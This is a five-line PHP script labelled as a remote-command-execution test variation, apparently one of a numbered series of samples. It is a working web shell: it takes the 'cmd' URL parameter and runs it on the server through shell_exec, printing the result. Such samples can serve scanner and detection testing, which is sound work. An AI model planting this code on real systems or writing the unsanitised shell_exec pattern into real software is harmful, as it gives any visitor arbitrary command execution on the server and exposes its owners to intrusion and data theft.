<?php
// RCE test variation #689
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>